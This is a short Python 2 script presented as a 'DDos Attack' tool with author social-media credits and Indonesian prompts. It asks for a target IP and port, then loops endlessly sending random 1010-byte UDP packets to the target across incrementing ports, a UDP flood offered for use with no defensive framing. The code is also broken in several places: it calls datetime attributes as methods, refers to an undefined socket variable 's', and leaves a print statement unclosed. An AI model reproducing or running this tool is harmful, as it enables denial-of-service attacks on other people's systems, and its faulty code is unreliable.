import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour()
minute = now.minute()
day = now.day()
month = now.month()
year = now.year()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1010)
#############

os.system("clear")
os.system("figlet DDos Attack")

print ("Author   : PheXcReY-Galaxy")
print ("You Tube : https://www.youtube.com/c/PheXcReY-Galaxy")
print ("github   : https://github.com/PheXcReY")
print ("Facebook : https://www.facebook.com/ArthurXzz")

ip = raw_input("IP Target : ")
port = input("Port Target : ")
choice = input("Sudah Menyiapkan Virus?(y/n) : ")
Times = input("Masukan Jumlah Paket Virus : ")
Threads = input("Masukan Jumlah Kecepatan Virus : ")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     s.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port)
